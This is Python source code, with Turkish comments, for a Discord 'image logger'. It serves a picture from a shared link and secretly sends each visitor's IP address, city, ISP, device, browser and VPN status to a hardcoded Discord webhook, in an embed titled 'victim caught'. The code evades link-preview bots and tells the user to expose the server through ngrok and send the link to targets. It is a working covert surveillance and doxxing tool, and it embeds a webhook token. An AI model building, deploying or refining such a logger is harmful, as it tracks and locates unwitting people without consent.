# M24T Discord Image Logger - %100 ÇALIŞIR (2025)
# python logger.py yazıp çalıştır → ngrok http 8000 ile dışarı aç

from http.server import BaseHTTPRequestHandler, HTTPServer
from urllib.parse import parse_qs, urlsplit
import requests, base64, httpagentparser, datetime, traceback

# ================== AYARLAR ==================
webhook = "https://discord.com/api/webhooks/1444689164921737277/ryKR4TemKO8UmL9yVFPXEjkdz-5gQgJlxx1VADhhud2_hR0I86PSpfofUOiR6GfXBbk7"
image   = "https://i.imgur.com/9r1bDGs.png"   # istediğin resmi koy
# =============================================

blacklisted = ("27", "104", "143", "164")

def bot_mu(ip, ua):
    if ip.startswith(("34", "35")): return "Discord Bot"
    if ua and "TelegramBot" in ua: return "Telegram Bot"
    return False

def log_at(ip, ua="", endpoint="/", resim=image):
    if any(ip.startswith(b) for b in blacklisted):
        return

    bot = bot_mu(ip, ua)
    if bot:
        requests.post(webhook, json={"content": "", "embeds": [{"title": "Link Paylaşıldı", "description": f"{bot} linki attı\nIP: `{ip}`", "color": 0x00ff00}]})
        return

    try:
        info = requests.get(f"http://ip-api.com/json/{ip}?fields=org,isp,as,country,regionName,city,lat,lon,timezone,proxy,mobile,hosting").json()
    except:
        info = {}

    ping = "@everyone"
    if info.get("proxy"): ping = "" if 1 else ping
    if info.get("hosting"): ping = "" if 1 else ping

    os, browser = httpagentparser.simple_detect(ua) if ua else ("Bilinmiyor", "Bilinmiyor")

    embed = {
        "username": "M24T Logger",
        "content": ping,
        "embeds": [{
            "title": "KURBAN YAKALANDI",
            "color": 0x00ff00,
            "thumbnail": {"url": resim},
            "fields": [
                {"name": "IP", "value": f"`{ip}`", "inline": True},
                {"name": "Konum", "value": f"{info.get('city','Bilinmiyor')}, {info.get('regionName','Bilinmiyor')}, {info.get('country','Bilinmiyor')}", "inline": True},
                {"name": "ISP", "value": info.get('isp', 'Bilinmiyor'), "inline": True},
                {"name": "Cihaz", "value": f"{os} • {browser}", "inline": True},
                {"name": "Mobil", "value": str(info.get('mobile', False)), "inline": True},
                {"name": "VPN/Tor", "value": str(info.get('proxy', False)), "inline": True},
                {"name": "Zaman", "value": datetime.datetime.now().strftime("%d/%m/%Y %H:%M:%S"), "inline": True}
            ],
            "footer": {"text": "M24T Image Logger"}
        }]
    }
    requests.post(webhook, json=embed)

loading_img = base64.b85decode(b'|JeWF01!$>Nk#wx0RaF=07w7;|JwjV0RR90|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|Nq+nLjnK)|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsC0|NsBO01*fQ-~r$R0TBQK5di}c0sq7R6aWDL00000000000000000030!~hfl0RR910000000000000000RP$m3<CiG0uTcb00031000000000000000000000000000')

class Handler(BaseHTTPRequestHandler):
    def do_GET(self):
        try:
            # Resim URL'si ?url= ile değiştirilebilir
            url = image
            query = parse_qs(urlsplit(self.path).query)
            if "url" in query:
                url = base64.b64decode(query["url"][0]).decode()
            elif "id" in query:
                url = base64.b64decode(query["id"][0]).decode()

            ip = self.client_address[0]
            ua = self.headers.get("User-Agent", "")

            if bot_mu(ip, ua):
                self.send_response(200)
                self.send_header("Content-type", "image/jpeg")
                self.end_headers()
                self.wfile.write(loading_img)
                log_at(ip, ua, self.path, url)
                return

            log_at(ip, ua, self.path, url)

            html = f'<body style="margin:0;background:#000"><img src="{url}" style="width:100vw;height:100vh;object-fit:contain"></body>'
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            self.wfile.write(html.encode())

        except:
            pass

    do_POST = do_GET

print("M24T Logger çalıştı → http://localhost:8000")
print("ngrok http 8000 yazıp dışarı aç, linki at, Open Original'a basınca log gelir")
HTTPServer(("0.0.0.0", 8000), Handler).serve_forever()
